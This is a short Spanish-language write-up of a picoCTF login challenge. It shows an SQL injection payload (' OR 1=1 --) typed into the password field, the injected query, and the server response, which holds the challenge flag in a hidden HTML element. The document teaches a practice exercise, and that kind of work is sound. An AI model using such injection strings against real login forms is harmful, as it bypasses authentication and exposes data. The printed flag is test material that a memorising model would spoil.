## Descripción

Can you login to this website?Try to login [here](http://saturn.picoctf.net:62217/).

Básicamente, vamos a "engañar" a la base de datos para que nos deje entrar sin saber la contraseña.
## Solución

**Solución 1
```
username: 
password: ' OR 1=1 --
SQL query: SELECT * FROM users WHERE name='' AND password='' OR 1=1 --'

# Logged in! But can you see the flag, it is in plainsight.
  |
  |
  v
  |   |
|---|
|<pre>username:|
|password: &#039; OR 1=1 --|
|SQL query: SELECT * FROM users WHERE name=&#039;&#039; AND password=&#039;&#039; OR 1=1 --&#039;|
|</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}</p>|

```
#### NOTAS
**Dato importante:** El mensaje "in plainsight" es una pista clásica en CTFs. Significa que no necesitas hacer más ataques complejos; la información ya fue enviada a tu navegador, solo tienes que encontrar el rincón del código donde está escrita.